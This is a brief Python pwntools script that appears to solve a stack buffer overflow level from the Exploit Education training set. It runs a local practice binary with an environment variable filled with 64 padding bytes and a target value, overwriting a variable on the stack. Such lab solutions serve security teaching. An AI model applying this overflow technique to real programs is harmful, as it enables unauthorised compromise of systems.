#!/usr/bin/env python3

from pwn import *
import subprocess, os

payload = p64(0x8dca79fa).rstrip(b'\x00')


p = process('/home/stack2/stack2', env={'ExploitEducation' : b'A' * 64 + payload})
output = p.recvline(timeout=5)
output = p.recvline(timeout=5)
output = p.recvline(timeout=5)
output = p.recvline(timeout=5)
print(output)